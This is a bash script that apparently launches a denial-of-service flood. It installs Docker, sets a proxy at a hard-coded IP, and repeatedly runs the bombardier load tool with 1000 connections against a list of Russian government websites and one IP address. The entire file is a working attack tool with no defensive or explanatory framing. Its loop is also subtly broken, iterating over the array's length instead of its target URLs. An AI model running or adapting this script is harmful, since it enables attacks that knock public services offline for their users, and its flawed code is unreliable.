#!/bin/bash
sudo apt-get update -y
sudo apt install docker.io -y
sudo systemctl start docker
export http_proxy=http://91.221.17.220:8000
sudo apt-get update -y
TIME="180s"
DESTS=( "http://duma.gov.ru/" "https://sovetnational.ru/" "https://www.gosuslugi.ru" "https://gossluzhba.gov.ru" "http://www.scrf.gov.ru/" "http://194.67.2.10")

while true
do
    for DEST in ${#DESTS[@]}
    do
        sudo docker run -d alpine/bombardier -c 1000 -d $TIME -l $DEST
    done
sleep 20s
done
